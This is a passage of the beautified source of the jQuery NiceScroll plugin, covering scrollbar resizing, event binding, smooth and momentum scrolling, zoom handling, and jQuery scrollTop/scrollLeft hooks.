            a.page = b ? b : a.getContentSize();
            a.page.maxh = Math.max(0, a.page.h - a.view.h);
            a.page.maxw = Math.max(0, a.page.w - a.view.w);
            if (a.page.maxh == f && a.page.maxw == d && a.view.w == e) {
                if (a.ispage)
                    return a;
                f = a.win.offset();
                if (a.lastposition && (d = a.lastposition,
                d.top == f.top && d.left == f.left))
                    return a;
                a.lastposition = f
            }
            0 == a.page.maxh ? (a.hideRail(),
            a.scrollvaluemax = 0,
            a.scroll.y = 0,
            a.scrollratio.y = 0,
            a.cursorheight = 0,
            a.setScrollTop(0),
            a.rail.scrollable = !1) : a.rail.scrollable = !0;
            0 == a.page.maxw ? (a.hideRailHr(),
            a.scrollvaluemaxw = 0,
            a.scroll.x = 0,
            a.scrollratio.x = 0,
            a.cursorwidth = 0,
            a.setScrollLeft(0),
            a.railh.scrollable = !1) : a.railh.scrollable = !0;
            a.locked = 0 == a.page.maxh && 0 == a.page.maxw;
            if (a.locked)
                return a.ispage || a.updateScrollBar(a.view),
                !1;
            !a.hidden && !a.visibility ? a.showRail().showRailHr() : !a.hidden && !a.railh.visibility && a.showRailHr();
            a.istextarea && (a.win.css("resize") && "none" != a.win.css("resize")) && (a.view.h -= 20);
            a.cursorheight = Math.min(a.view.h, Math.round(a.view.h * (a.view.h / a.page.h)));
            a.cursorheight = a.opt.cursorfixedheight ? a.opt.cursorfixedheight : Math.max(a.opt.cursorminheight, a.cursorheight);
            a.cursorwidth = Math.min(a.view.w, Math.round(a.view.w * (a.view.w / a.page.w)));
            a.cursorwidth = a.opt.cursorfixedheight ? a.opt.cursorfixedheight : Math.max(a.opt.cursorminheight, a.cursorwidth);
            a.scrollvaluemax = a.view.h - a.cursorheight - a.cursor.hborder;
            a.railh && (a.railh.width = 0 < a.page.maxh ? a.view.w - a.rail.width : a.view.w,
            a.scrollvaluemaxw = a.railh.width - a.cursorwidth - a.cursorh.wborder);
            a.ispage || a.updateScrollBar(a.view);
            a.scrollratio = {
                x: a.page.maxw / a.scrollvaluemaxw,
                y: a.page.maxh / a.scrollvaluemax
            };
            a.getScrollTop() > a.page.maxh ? a.doScrollTop(a.page.maxh) : (a.scroll.y = Math.round(a.getScrollTop() * (1 / a.scrollratio.y)),
            a.scroll.x = Math.round(a.getScrollLeft() * (1 / a.scrollratio.x)),
            a.cursoractive && a.noticeCursor());
            a.scroll.y && 0 == a.getScrollTop() && a.doScrollTo(Math.floor(a.scroll.y * a.scrollratio.y));
            return a
        }
        ;
        this.resize = a.onResize;
        this.lazyResize = function(c) {
            c = isNaN(c) ? 30 : c;
            a.delayed("resize", a.resize, c);
            return a
        }
        ;
        this._bind = function(c, b, f, d) {
            a.events.push({
                e: c,
                n: b,
                f: f,
                b: d,
                q: !1
            });
            c.addEventListener ? c.addEventListener(b, f, d || !1) : c.attachEvent ? c.attachEvent("on" + b, f) : c["on" + b] = f
        }
        ;
        this.jqbind = function(c, b, f) {
            a.events.push({
                e: c,
                n: b,
                f: f,
                q: !0
            });
            e(c).bind(b, f)
        }
        ;
        this.bind = function(c, b, f, e) {
            var h = "jquery"in c ? c[0] : c;
            "mousewheel" == b ? "onwheel"in a.win ? a._bind(h, "wheel", f, e || !1) : (c = "undefined" != typeof document.onmousewheel ? "mousewheel" : "DOMMouseScroll",
            l(h, c, f, e || !1),
            "DOMMouseScroll" == c && l(h, "MozMousePixelScroll", f, e || !1)) : h.addEventListener ? (d.cantouch && /mouseup|mousedown|mousemove/.test(b) && a._bind(h, "mousedown" == b ? "touchstart" : "mouseup" == b ? "touchend" : "touchmove", function(a) {
                if (a.touches) {
                    if (2 > a.touches.length) {
                        var c = a.touches.length ? a.touches[0] : a;
                        c.original = a;
                        f.call(this, c)
                    }
                } else
                    a.changedTouches && (c = a.changedTouches[0],
                    c.original = a,
                    f.call(this, c))
            }, e || !1),
            a._bind(h, b, f, e || !1),
            d.cantouch && "mouseup" == b && a._bind(h, "touchcancel", f, e || !1)) : a._bind(h, b, function(c) {
                if ((c = c || window.event || !1) && c.srcElement)
                    c.target = c.srcElement;
                "pageY"in c || (c.pageX = c.clientX + document.documentElement.scrollLeft,
                c.pageY = c.clientY + document.documentElement.scrollTop);
                return !1 === f.call(h, c) || !1 === e ? a.cancelEvent(c) : !0
            })
        }
        ;
        this._unbind = function(a, b, f, d) {
            a.removeEventListener ? a.removeEventListener(b, f, d) : a.detachEvent ? a.detachEvent("on" + b, f) : a["on" + b] = !1
        }
        ;
        this.unbindAll = function() {
            for (var c = 0; c < a.events.length; c++) {
                var b = a.events[c];
                b.q ? b.e.unbind(b.n, b.f) : a._unbind(b.e, b.n, b.f, b.b)
            }
        }
        ;
        this.cancelEvent = function(a) {
            a = a.original ? a.original : a ? a : window.event || !1;
            if (!a)
                return !1;
            a.preventDefault && a.preventDefault();
            a.stopPropagation && a.stopPropagation();
            a.preventManipulation && a.preventManipulation();
            a.cancelBubble = !0;
            a.cancel = !0;
            return a.returnValue = !1
        }
        ;
        this.stopPropagation = function(a) {
            a = a.original ? a.original : a ? a : window.event || !1;
            if (!a)
                return !1;
            if (a.stopPropagation)
                return a.stopPropagation();
            a.cancelBubble && (a.cancelBubble = !0);
            return !1
        }
        ;
        this.showRail = function() {
            if (0 != a.page.maxh && (a.ispage || "none" != a.win.css("display")))
                a.visibility = !0,
                a.rail.visibility = !0,
                a.rail.css("display", "block");
            return a
        }
        ;
        this.showRailHr = function() {
            if (!a.railh)
                return a;
            if (0 != a.page.maxw && (a.ispage || "none" != a.win.css("display")))
                a.railh.visibility = !0,
                a.railh.css("display", "block");
            return a
        }
        ;
        this.hideRail = function() {
            a.visibility = !1;
            a.rail.visibility = !1;
            a.rail.css("display", "none");
            return a
        }
        ;
        this.hideRailHr = function() {
            if (!a.railh)
                return a;
            a.railh.visibility = !1;
            a.railh.css("display", "none");
            return a
        }
        ;
        this.show = function() {
            a.hidden = !1;
            a.locked = !1;
            return a.showRail().showRailHr()
        }
        ;
        this.hide = function() {
            a.hidden = !0;
            a.locked = !0;
            return a.hideRail().hideRailHr()
        }
        ;
        this.toggle = function() {
            return a.hidden ? a.show() : a.hide()
        }
        ;
        this.remove = function() {
            a.stop();
            a.cursortimeout && clearTimeout(a.cursortimeout);
            a.doZoomOut();
            a.unbindAll();
            d.isie9 && a.win[0].detachEvent("onpropertychange", a.onAttributeChange);
            !1 !== a.observer && a.observer.disconnect();
            !1 !== a.observerremover && a.observerremover.disconnect();
            a.events = null;
            a.cursor && a.cursor.remove();
            a.cursorh && a.cursorh.remove();
            a.rail && a.rail.remove();
            a.railh && a.railh.remove();
            a.zoom && a.zoom.remove();
            for (var c = 0; c < a.saved.css.length; c++) {
                var b = a.saved.css[c];
                b[0].css(b[1], "undefined" == typeof b[2] ? "" : b[2])
            }
            a.saved = !1;
            a.me.data("__nicescroll", "");
            var f = e.nicescroll;
            f.each(function(c) {
                if (this && this.id === a.id) {
                    delete f[c];
                    for (var b = ++c; b < f.length; b++,
                    c++)
                        f[c] = f[b];
                    f.length--;
                    f.length && delete f[f.length]
                }
            });
            for (var h in a)
                a[h] = null,
                delete a[h];
            a = null
        }
        ;
        this.scrollstart = function(c) {
            this.onscrollstart = c;
            return a
        }
        ;
        this.scrollend = function(c) {
            this.onscrollend = c;
            return a
        }
        ;
        this.scrollcancel = function(c) {
            this.onscrollcancel = c;
            return a
        }
        ;
        this.zoomin = function(c) {
            this.onzoomin = c;
            return a
        }
        ;
        this.zoomout = function(c) {
            this.onzoomout = c;
            return a
        }
        ;
        this.isScrollable = function(a) {
            a = a.target ? a.target : a;
            if ("OPTION" == a.nodeName)
                return !0;
            for (; a && 1 == a.nodeType && !/^BODY|HTML/.test(a.nodeName); ) {
                var b = e(a)
                  , b = b.css("overflowY") || b.css("overflowX") || b.css("overflow") || "";
                if (/scroll|auto/.test(b))
                    return a.clientHeight != a.scrollHeight;
                a = a.parentNode ? a.parentNode : !1
            }
            return !1
        }
        ;
        this.getViewport = function(a) {
            for (a = a && a.parentNode ? a.parentNode : !1; a && 1 == a.nodeType && !/^BODY|HTML/.test(a.nodeName); ) {
                var b = e(a);
                if (/fixed|absolute/.test(b.css("position")))
                    return b;
                var f = b.css("overflowY") || b.css("overflowX") || b.css("overflow") || "";
                if (/scroll|auto/.test(f) && a.clientHeight != a.scrollHeight || 0 < b.getNiceScroll().length)
                    return b;
                a = a.parentNode ? a.parentNode : !1
            }
            return a ? e(a) : !1
        }
        ;
        this.triggerScrollEnd = function() {
            if (a.onscrollend) {
                var c = a.getScrollLeft()
                  , b = a.getScrollTop();
                a.onscrollend.call(a, {
                    type: "scrollend",
                    current: {
                        x: c,
                        y: b
                    },
                    end: {
                        x: c,
                        y: b
                    }
                })
            }
        }
        ;
        this.onmousewheel = function(c) {
            if (!a.wheelprevented) {
                if (a.locked)
                    return a.debounced("checkunlock", a.resize, 250),
                    !0;
                if (a.rail.drag)
                    return a.cancelEvent(c);
                "auto" == a.opt.oneaxismousemode && 0 != c.deltaX && (a.opt.oneaxismousemode = !1);
                if (a.opt.oneaxismousemode && 0 == c.deltaX && !a.rail.scrollable)
                    return a.railh && a.railh.scrollable ? a.onmousewheelhr(c) : !0;
                var b = +new Date
                  , f = !1;
                a.opt.preservenativescrolling && a.checkarea + 600 < b && (a.nativescrollingarea = a.isScrollable(c),
                f = !0);
                a.checkarea = b;
                if (a.nativescrollingarea)
                    return !0;
                if (c = q(c, !1, f))
                    a.checkarea = 0;
                return c
            }
        }
        ;
        this.onmousewheelhr = function(c) {
            if (!a.wheelprevented) {
                if (a.locked || !a.railh.scrollable)
                    return !0;
                if (a.rail.drag)
                    return a.cancelEvent(c);
                var b = +new Date
                  , f = !1;
                a.opt.preservenativescrolling && a.checkarea + 600 < b && (a.nativescrollingarea = a.isScrollable(c),
                f = !0);
                a.checkarea = b;
                return a.nativescrollingarea ? !0 : a.locked ? a.cancelEvent(c) : q(c, !0, f)
            }
        }
        ;
        this.stop = function() {
            a.cancelScroll();
            a.scrollmon && a.scrollmon.stop();
            a.cursorfreezed = !1;
            a.scroll.y = Math.round(a.getScrollTop() * (1 / a.scrollratio.y));
            a.noticeCursor();
            return a
        }
        ;
        this.getTransitionSpeed = function(b) {
            var d = Math.round(10 * a.opt.scrollspeed);
            b = Math.min(d, Math.round(b / 20 * a.opt.scrollspeed));
            return 20 < b ? b : 0
        }
        ;
        a.opt.smoothscroll ? a.ishwscroll && d.hastransition && a.opt.usetransition ? (this.prepareTransition = function(b, e) {
            var f = e ? 20 < b ? b : 0 : a.getTransitionSpeed(b)
              , h = f ? d.prefixstyle + "transform " + f + "ms ease-out" : "";
            if (!a.lasttransitionstyle || a.lasttransitionstyle != h)
                a.lasttransitionstyle = h,
                a.doc.css(d.transitionstyle, h);
            return f
        }
        ,
        this.doScrollLeft = function(b, d) {
            var f = a.scrollrunning ? a.newscrolly : a.getScrollTop();
            a.doScrollPos(b, f, d)
        }
        ,
        this.doScrollTop = function(b, d) {
            var f = a.scrollrunning ? a.newscrollx : a.getScrollLeft();
            a.doScrollPos(f, b, d)
        }
        ,
        this.doScrollPos = function(b, e, f) {
            var h = a.getScrollTop()
              , g = a.getScrollLeft();
            (0 > (a.newscrolly - h) * (e - h) || 0 > (a.newscrollx - g) * (b - g)) && a.cancelScroll();
            !1 == a.opt.bouncescroll && (0 > e ? e = 0 : e > a.page.maxh && (e = a.page.maxh),
            0 > b ? b = 0 : b > a.page.maxw && (b = a.page.maxw));
            if (a.scrollrunning && b == a.newscrollx && e == a.newscrolly)
                return !1;
            a.newscrolly = e;
            a.newscrollx = b;
            a.newscrollspeed = f || !1;
            if (a.timer)
                return !1;
            a.timer = setTimeout(function() {
                var f = a.getScrollTop(), h = a.getScrollLeft(), g, k;
                g = b - h;
                k = e - f;
                g = Math.round(Math.sqrt(Math.pow(g, 2) + Math.pow(k, 2)));
                g = a.newscrollspeed && 1 < a.newscrollspeed ? a.newscrollspeed : a.getTransitionSpeed(g);
                a.newscrollspeed && 1 >= a.newscrollspeed && (g *= a.newscrollspeed);
                a.prepareTransition(g, !0);
                a.timerscroll && a.timerscroll.tm && clearInterval(a.timerscroll.tm);
                0 < g && (!a.scrollrunning && a.onscrollstart && a.onscrollstart.call(a, {
                    type: "scrollstart",
                    current: {
                        x: h,
                        y: f
                    },
                    request: {
                        x: b,
                        y: e
                    },
                    end: {
                        x: a.newscrollx,
                        y: a.newscrolly
                    },
                    speed: g
                }),
                d.transitionend ? a.scrollendtrapped || (a.scrollendtrapped = !0,
                a.bind(a.doc, d.transitionend, a.onScrollTransitionEnd, !1)) : (a.scrollendtrapped && clearTimeout(a.scrollendtrapped),
                a.scrollendtrapped = setTimeout(a.onScrollTransitionEnd, g)),
                a.timerscroll = {
                    bz: new BezierClass(f,a.newscrolly,g,0,0,0.58,1),
                    bh: new BezierClass(h,a.newscrollx,g,0,0,0.58,1)
                },
                a.cursorfreezed || (a.timerscroll.tm = setInterval(function() {
                    a.showCursor(a.getScrollTop(), a.getScrollLeft())
                }, 60)));
                a.synched("doScroll-set", function() {
                    a.timer = 0;
                    a.scrollendtrapped && (a.scrollrunning = !0);
                    a.setScrollTop(a.newscrolly);
                    a.setScrollLeft(a.newscrollx);
                    if (!a.scrollendtrapped)
                        a.onScrollTransitionEnd()
                })
            }, 50)
        }
        ,
        this.cancelScroll = function() {
            if (!a.scrollendtrapped)
                return !0;
            var b = a.getScrollTop()
              , e = a.getScrollLeft();
            a.scrollrunning = !1;
            d.transitionend || clearTimeout(d.transitionend);
            a.scrollendtrapped = !1;
            a._unbind(a.doc, d.transitionend, a.onScrollTransitionEnd);
            a.prepareTransition(0);
            a.setScrollTop(b);
            a.railh && a.setScrollLeft(e);
            a.timerscroll && a.timerscroll.tm && clearInterval(a.timerscroll.tm);
            a.timerscroll = !1;
            a.cursorfreezed = !1;
            a.showCursor(b, e);
            return a
        }
        ,
        this.onScrollTransitionEnd = function() {
            a.scrollendtrapped && a._unbind(a.doc, d.transitionend, a.onScrollTransitionEnd);
            a.scrollendtrapped = !1;
            a.prepareTransition(0);
            a.timerscroll && a.timerscroll.tm && clearInterval(a.timerscroll.tm);
            a.timerscroll = !1;
            var b = a.getScrollTop()
              , e = a.getScrollLeft();
            a.setScrollTop(b);
            a.railh && a.setScrollLeft(e);
            a.noticeCursor(!1, b, e);
            a.cursorfreezed = !1;
            0 > b ? b = 0 : b > a.page.maxh && (b = a.page.maxh);
            0 > e ? e = 0 : e > a.page.maxw && (e = a.page.maxw);
            if (b != a.newscrolly || e != a.newscrollx)
                return a.doScrollPos(e, b, a.opt.snapbackspeed);
            a.onscrollend && a.scrollrunning && a.triggerScrollEnd();
            a.scrollrunning = !1
        }
        ) : (this.doScrollLeft = function(b, d) {
            var f = a.scrollrunning ? a.newscrolly : a.getScrollTop();
            a.doScrollPos(b, f, d)
        }
        ,
        this.doScrollTop = function(b, d) {
            var f = a.scrollrunning ? a.newscrollx : a.getScrollLeft();
            a.doScrollPos(f, b, d)
        }
        ,
        this.doScrollPos = function(b, d, f) {
            function e() {
                if (a.cancelAnimationFrame)
                    return !0;
                a.scrollrunning = !0;
                if (p = 1 - p)
                    return a.timer = s(e) || 1;
                var b = 0
                  , c = sy = a.getScrollTop();
                if (a.dst.ay) {
                    var c = a.bzscroll ? a.dst.py + a.bzscroll.getNow() * a.dst.ay : a.newscrolly
                      , f = c - sy;
                    if (0 > f && c < a.newscrolly || 0 < f && c > a.newscrolly)
                        c = a.newscrolly;
                    a.setScrollTop(c);
                    c == a.newscrolly && (b = 1)
                } else
                    b = 1;
                var d = sx = a.getScrollLeft();
                if (a.dst.ax) {
                    d = a.bzscroll ? a.dst.px + a.bzscroll.getNow() * a.dst.ax : a.newscrollx;
                    f = d - sx;
                    if (0 > f && d < a.newscrollx || 0 < f && d > a.newscrollx)
                        d = a.newscrollx;
                    a.setScrollLeft(d);
                    d == a.newscrollx && (b += 1)
                } else
                    b += 1;
                2 == b ? (a.timer = 0,
                a.cursorfreezed = !1,
                a.bzscroll = !1,
                a.scrollrunning = !1,
                0 > c ? c = 0 : c > a.page.maxh && (c = a.page.maxh),
                0 > d ? d = 0 : d > a.page.maxw && (d = a.page.maxw),
                d != a.newscrollx || c != a.newscrolly ? a.doScrollPos(d, c) : a.onscrollend && a.triggerScrollEnd()) : a.timer = s(e) || 1
            }
            d = "undefined" == typeof d || !1 === d ? a.getScrollTop(!0) : d;
            if (a.timer && a.newscrolly == d && a.newscrollx == b)
                return !0;
            a.timer && v(a.timer);
            a.timer = 0;
            var h = a.getScrollTop()
              , g = a.getScrollLeft();
            (0 > (a.newscrolly - h) * (d - h) || 0 > (a.newscrollx - g) * (b - g)) && a.cancelScroll();
            a.newscrolly = d;
            a.newscrollx = b;
            if (!a.bouncescroll || !a.rail.visibility)
                0 > a.newscrolly ? a.newscrolly = 0 : a.newscrolly > a.page.maxh && (a.newscrolly = a.page.maxh);
            if (!a.bouncescroll || !a.railh.visibility)
                0 > a.newscrollx ? a.newscrollx = 0 : a.newscrollx > a.page.maxw && (a.newscrollx = a.page.maxw);
            a.dst = {};
            a.dst.x = b - g;
            a.dst.y = d - h;
            a.dst.px = g;
            a.dst.py = h;
            var k = Math.round(Math.sqrt(Math.pow(a.dst.x, 2) + Math.pow(a.dst.y, 2)));
            a.dst.ax = a.dst.x / k;
            a.dst.ay = a.dst.y / k;
            var l = 0
              , q = k;
            0 == a.dst.x ? (l = h,
            q = d,
            a.dst.ay = 1,
            a.dst.py = 0) : 0 == a.dst.y && (l = g,
            q = b,
            a.dst.ax = 1,
            a.dst.px = 0);
            k = a.getTransitionSpeed(k);
            f && 1 >= f && (k *= f);
            a.bzscroll = 0 < k ? a.bzscroll ? a.bzscroll.update(q, k) : new BezierClass(l,q,k,0,1,0,1) : !1;
            if (!a.timer) {
                (h == a.page.maxh && d >= a.page.maxh || g == a.page.maxw && b >= a.page.maxw) && a.checkContentSize();
                var p = 1;
                a.cancelAnimationFrame = !1;
                a.timer = 1;
                a.onscrollstart && !a.scrollrunning && a.onscrollstart.call(a, {
                    type: "scrollstart",
                    current: {
                        x: g,
                        y: h
                    },
                    request: {
                        x: b,
                        y: d
                    },
                    end: {
                        x: a.newscrollx,
                        y: a.newscrolly
                    },
                    speed: k
                });
                e();
                (h == a.page.maxh && d >= h || g == a.page.maxw && b >= g) && a.checkContentSize();
                a.noticeCursor()
            }
        }
        ,
        this.cancelScroll = function() {
            a.timer && v(a.timer);
            a.timer = 0;
            a.bzscroll = !1;
            a.scrollrunning = !1;
            return a
        }
        ) : (this.doScrollLeft = function(b, d) {
            var f = a.getScrollTop();
            a.doScrollPos(b, f, d)
        }
        ,
        this.doScrollTop = function(b, d) {
            var f = a.getScrollLeft();
            a.doScrollPos(f, b, d)
        }
        ,
        this.doScrollPos = function(b, d, f) {
            var e = b > a.page.maxw ? a.page.maxw : b;
            0 > e && (e = 0);
            var h = d > a.page.maxh ? a.page.maxh : d;
            0 > h && (h = 0);
            a.synched("scroll", function() {
                a.setScrollTop(h);
                a.setScrollLeft(e)
            })
        }
        ,
        this.cancelScroll = function() {}
        );
        this.doScrollBy = function(b, d) {
            var f = 0
              , f = d ? Math.floor((a.scroll.y - b) * a.scrollratio.y) : (a.timer ? a.newscrolly : a.getScrollTop(!0)) - b;
            if (a.bouncescroll) {
                var e = Math.round(a.view.h / 2);
                f < -e ? f = -e : f > a.page.maxh + e && (f = a.page.maxh + e)
            }
            a.cursorfreezed = !1;
            py = a.getScrollTop(!0);
            if (0 > f && 0 >= py)
                return a.noticeCursor();
            if (f > a.page.maxh && py >= a.page.maxh)
                return a.checkContentSize(),
                a.noticeCursor();
            a.doScrollTop(f)
        }
        ;
        this.doScrollLeftBy = function(b, d) {
            var f = 0
              , f = d ? Math.floor((a.scroll.x - b) * a.scrollratio.x) : (a.timer ? a.newscrollx : a.getScrollLeft(!0)) - b;
            if (a.bouncescroll) {
                var e = Math.round(a.view.w / 2);
                f < -e ? f = -e : f > a.page.maxw + e && (f = a.page.maxw + e)
            }
            a.cursorfreezed = !1;
            px = a.getScrollLeft(!0);
            if (0 > f && 0 >= px || f > a.page.maxw && px >= a.page.maxw)
                return a.noticeCursor();
            a.doScrollLeft(f)
        }
        ;
        this.doScrollTo = function(b, d) {
            d && Math.round(b * a.scrollratio.y);
            a.cursorfreezed = !1;
            a.doScrollTop(b)
        }
        ;
        this.checkContentSize = function() {
            var b = a.getContentSize();
            (b.h != a.page.h || b.w != a.page.w) && a.resize(!1, b)
        }
        ;
        a.onscroll = function(b) {
            a.rail.drag || a.cursorfreezed || a.synched("scroll", function() {
                a.scroll.y = Math.round(a.getScrollTop() * (1 / a.scrollratio.y));
                a.railh && (a.scroll.x = Math.round(a.getScrollLeft() * (1 / a.scrollratio.x)));
                a.noticeCursor()
            })
        }
        ;
        a.bind(a.docscroll, "scroll", a.onscroll);
        this.doZoomIn = function(b) {
            if (!a.zoomactive) {
                a.zoomactive = !0;
                a.zoomrestore = {
                    style: {}
                };
                var h = "position top left zIndex backgroundColor marginTop marginBottom marginLeft marginRight".split(" "), f = a.win[0].style, g;
                for (g in h) {
                    var k = h[g];
                    a.zoomrestore.style[k] = "undefined" != typeof f[k] ? f[k] : ""
                }
                a.zoomrestore.style.width = a.win.css("width");
                a.zoomrestore.style.height = a.win.css("height");
                a.zoomrestore.padding = {
                    w: a.win.outerWidth() - a.win.width(),
                    h: a.win.outerHeight() - a.win.height()
                };
                d.isios4 && (a.zoomrestore.scrollTop = e(window).scrollTop(),
                e(window).scrollTop(0));
                a.win.css({
                    position: d.isios4 ? "absolute" : "fixed",
                    top: 0,
                    left: 0,
                    "z-index": x + 100,
                    margin: "0px"
                });
                h = a.win.css("backgroundColor");
                ("" == h || /transparent|rgba\(0, 0, 0, 0\)|rgba\(0,0,0,0\)/.test(h)) && a.win.css("backgroundColor", "#fff");
                a.rail.css({
                    "z-index": x + 101
                });
                a.zoom.css({
                    "z-index": x + 102
                });
                a.zoom.css("backgroundPosition", "0px -18px");
                a.resizeZoom();
                a.onzoomin && a.onzoomin.call(a);
                return a.cancelEvent(b)
            }
        }
        ;
        this.doZoomOut = function(b) {
            if (a.zoomactive)
                return a.zoomactive = !1,
                a.win.css("margin", ""),
                a.win.css(a.zoomrestore.style),
                d.isios4 && e(window).scrollTop(a.zoomrestore.scrollTop),
                a.rail.css({
                    "z-index": a.zindex
                }),
                a.zoom.css({
                    "z-index": a.zindex
                }),
                a.zoomrestore = !1,
                a.zoom.css("backgroundPosition", "0px 0px"),
                a.onResize(),
                a.onzoomout && a.onzoomout.call(a),
                a.cancelEvent(b)
        }
        ;
        this.doZoom = function(b) {
            return a.zoomactive ? a.doZoomOut(b) : a.doZoomIn(b)
        }
        ;
        this.resizeZoom = function() {
            if (a.zoomactive) {
                var b = a.getScrollTop();
                a.win.css({
                    width: e(window).width() - a.zoomrestore.padding.w + "px",
                    height: e(window).height() - a.zoomrestore.padding.h + "px"
                });
                a.onResize();
                a.setScrollTop(Math.min(a.page.maxh, b))
            }
        }
        ;
        this.init();
        e.nicescroll.push(this)
    }
      , H = function(e) {
        var b = this;
        this.nc = e;
        this.steptime = this.lasttime = this.speedy = this.speedx = this.lasty = this.lastx = 0;
        this.snapy = this.snapx = !1;
        this.demuly = this.demulx = 0;
        this.lastscrolly = this.lastscrollx = -1;
        this.timer = this.chky = this.chkx = 0;
        this.time = function() {
            return +new Date
        }
        ;
        this.reset = function(e, g) {
            b.stop();
            var l = b.time();
            b.steptime = 0;
            b.lasttime = l;
            b.speedx = 0;
            b.speedy = 0;
            b.lastx = e;
            b.lasty = g;
            b.lastscrollx = -1;
            b.lastscrolly = -1
        }
        ;
        this.update = function(e, g) {
            var l = b.time();
            b.steptime = l - b.lasttime;
            b.lasttime = l;
            var l = g - b.lasty
              , q = e - b.lastx
              , a = b.nc.getScrollTop()
              , p = b.nc.getScrollLeft()
              , a = a + l
              , p = p + q;
            b.snapx = 0 > p || p > b.nc.page.maxw;
            b.snapy = 0 > a || a > b.nc.page.maxh;
            b.speedx = q;
            b.speedy = l;
            b.lastx = e;
            b.lasty = g
        }
        ;
        this.stop = function() {
            b.nc.unsynched("domomentum2d");
            b.timer && clearTimeout(b.timer);
            b.timer = 0;
            b.lastscrollx = -1;
            b.lastscrolly = -1
        }
        ;
        this.doSnapy = function(e, g) {
            var l = !1;
            0 > g ? (g = 0,
            l = !0) : g > b.nc.page.maxh && (g = b.nc.page.maxh,
            l = !0);
            0 > e ? (e = 0,
            l = !0) : e > b.nc.page.maxw && (e = b.nc.page.maxw,
            l = !0);
            l ? b.nc.doScrollPos(e, g, b.nc.opt.snapbackspeed) : b.nc.triggerScrollEnd()
        }
        ;
        this.doMomentum = function(e) {
            var g = b.time()
              , l = e ? g + e : b.lasttime;
            e = b.nc.getScrollLeft();
            var q = b.nc.getScrollTop()
              , a = b.nc.page.maxh
              , p = b.nc.page.maxw;
            b.speedx = 0 < p ? Math.min(60, b.speedx) : 0;
            b.speedy = 0 < a ? Math.min(60, b.speedy) : 0;
            l = l && 60 >= g - l;
            if (0 > q || q > a || 0 > e || e > p)
                l = !1;
            e = b.speedx && l ? b.speedx : !1;
            if (b.speedy && l && b.speedy || e) {
                var d = Math.max(16, b.steptime);
                50 < d && (e = d / 50,
                b.speedx *= e,
                b.speedy *= e,
                d = 50);
                b.demulxy = 0;
                b.lastscrollx = b.nc.getScrollLeft();
                b.chkx = b.lastscrollx;
                b.lastscrolly = b.nc.getScrollTop();
                b.chky = b.lastscrolly;
                var r = b.lastscrollx
                  , t = b.lastscrolly
                  , s = function() {
                    var c = 600 < b.time() - g ? 0.04 : 0.02;
                    if (b.speedx && (r = Math.floor(b.lastscrollx - b.speedx * (1 - b.demulxy)),
                    b.lastscrollx = r,
                    0 > r || r > p))
                        c = 0.1;
                    if (b.speedy && (t = Math.floor(b.lastscrolly - b.speedy * (1 - b.demulxy)),
                    b.lastscrolly = t,
                    0 > t || t > a))
                        c = 0.1;
                    b.demulxy = Math.min(1, b.demulxy + c);
                    b.nc.synched("domomentum2d", function() {
                        b.speedx && (b.nc.getScrollLeft() != b.chkx && b.stop(),
                        b.chkx = r,
                        b.nc.setScrollLeft(r));
                        b.speedy && (b.nc.getScrollTop() != b.chky && b.stop(),
                        b.chky = t,
                        b.nc.setScrollTop(t));
                        b.timer || (b.nc.hideCursor(),
                        b.doSnapy(r, t))
                    });
                    1 > b.demulxy ? b.timer = setTimeout(s, d) : (b.stop(),
                    b.nc.hideCursor(),
                    b.doSnapy(r, t))
                };
                s()
            } else
                b.doSnapy(b.nc.getScrollLeft(), b.nc.getScrollTop())
        }
    }
      , w = e.fn.scrollTop;
    e.cssHooks.pageYOffset = {
        get: function(g, b, h) {
            return (b = e.data(g, "__nicescroll") || !1) && b.ishwscroll ? b.getScrollTop() : w.call(g)
        },
        set: function(g, b) {
            var h = e.data(g, "__nicescroll") || !1;
            h && h.ishwscroll ? h.setScrollTop(parseInt(b)) : w.call(g, b);
            return this
        }
    };
    e.fn.scrollTop = function(g) {
        if ("undefined" == typeof g) {
            var b = this[0] ? e.data(this[0], "__nicescroll") || !1 : !1;
            return b && b.ishwscroll ? b.getScrollTop() : w.call(this)
        }
        return this.each(function() {
            var b = e.data(this, "__nicescroll") || !1;
            b && b.ishwscroll ? b.setScrollTop(parseInt(g)) : w.call(e(this), g)
        })
    }
    ;
    var A = e.fn.scrollLeft;
    e.cssHooks.pageXOffset = {
        get: function(g, b, h) {
            return (b = e.data(g, "__nicescroll") || !1) && b.ishwscroll ? b.getScrollLeft() : A.call(g)
        },
        set: function(g, b) {
            var h = e.data(g, "__nicescroll") || !1;
            h && h.ishwscroll ? h.setScrollLeft(parseInt(b)) : A.call(g, b);
            return this
        }
    };
    e.fn.scrollLeft = function(g) {
        if ("undefined" == typeof g) {
            var b = this[0] ? e.data(this[0], "__nicescroll") || !1 : !1;
            return b && b.ishwscroll ? b.getScrollLeft() : A.call(this)
        }
        return this.each(function() {
            var b = e.data(this, "__nicescroll") || !1;
            b && b.ishwscroll ? b.setScrollLeft(parseInt(g)) : A.call(e(this), g)
        })
    }
    ;
    var B = function(g) {
        var b = this;
        this.length = 0;
        this.name = "nicescrollarray";
        this.each = function(e) {
            for (var g = 0, a = 0; g < b.length; g++)
                e.call(b[g], a++);
            return b
        }
        ;
        this.push = function(e) {
            b[b.length] = e;
            b.length++
        }
        ;
        this.eq = function(e) {
            return b[e]
        }
        ;
        if (g)
            for (var h = 0; h < g.length; h++) {
                var k = e.data(g[h], "__nicescroll") || !1;
                k && (this[this.length] = k,
                this.length++)
            }
        return this
    };
    (function(e, b, h) {
        for (var k = 0; k < b.length; k++)
            h(e, b[k])
    }
    )(B.prototype, "show hide toggle onResize resize remove stop doScrollPos".split(" "), function(e, b) {
        e[b] = function() {
            var e = arguments;
            return this.each(function() {
                this[b].apply(this, e)
            })
        }
    });
    e.fn.getNiceScroll = function(g) {
        return "undefined" == typeof g ? new B(this) : this[g] && e.data(this[g], "__nicescroll") || !1
    }
    ;
    e.extend(e.expr[":"], {
        nicescroll: function(g) {
            return e.data(g, "__nicescroll") ? !0 : !1
        }
    });
    e.fn.niceScroll = function(g, b) {
        "undefined" == typeof b && ("object" == typeof g && !("jquery"in g)) && (b = g,
        g = !1);
        var h = new B;
        "undefined" == typeof b && (b = {});
        g && (b.doc = e(g),
        b.win = e(this));
        var k = !("doc"in b);
        !k && !("win"in b) && (b.win = e(this));
        this.each(function() {
            var g = e(this).data("__nicescroll") || !1;
            g || (b.doc = k ? e(this) : b.doc,
            g = new N(b,e(this)),
            e(this).data("__nicescroll", g));
            h.push(g)
        });
        return 1 == h.length ? h[0] : h
    }
    ;
    window.NiceScroll = {
        getjQuery: function() {
            return e
        }
    };
